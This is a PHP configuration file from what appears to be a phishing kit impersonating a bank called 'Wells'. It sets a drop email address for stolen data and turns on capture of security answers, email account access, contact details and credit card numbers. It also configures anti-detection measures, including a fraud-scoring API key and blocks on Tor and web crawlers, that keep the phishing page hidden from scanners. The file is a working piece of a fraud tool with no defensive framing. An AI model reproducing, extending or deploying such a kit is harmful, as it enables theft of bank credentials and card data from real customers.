<?php

/**
 * DO NOT SELL THIS SCRIPT ! 
 * DO NOT CHANGE COPYRIGHT !
 * Wells -
 * version 1.0
 * Re-Loaded By Groot
 * icq+teleg = @iam_groot
 
###############################################
#$            C0d3d by Spoxcoder             $#
###############################################

**/

$show_question = "yes"; 
$show_email_access = "yes"; 
$show_contact_information = "yes";
$show_credit_card = "yes";
$show_success_page = "yes";

$your_email = "grayalpha@yandex.com"; // Your Fucking Email Here bro !! 
$redirect = "login";

$redirection = "yes";     			   // If you won't to Use Redirection Like { Domain.com/?id=wells } Make it Yes .
$api_protection = "yes";  			   // This Api For detect Frauds And Bad Bot fROM IP .
$Key = "mAt8YyNG48uhU2ncKyRNXAduUeeWI3UY"; // Your Key api protection DON't CHANGE IT BRO ...

$anti_proxy = "no";
$anti_vpn = "no";
$anti_tor = "yes";
$anti_web_crawler ="yes";
$max_fraud_score = "101";

?>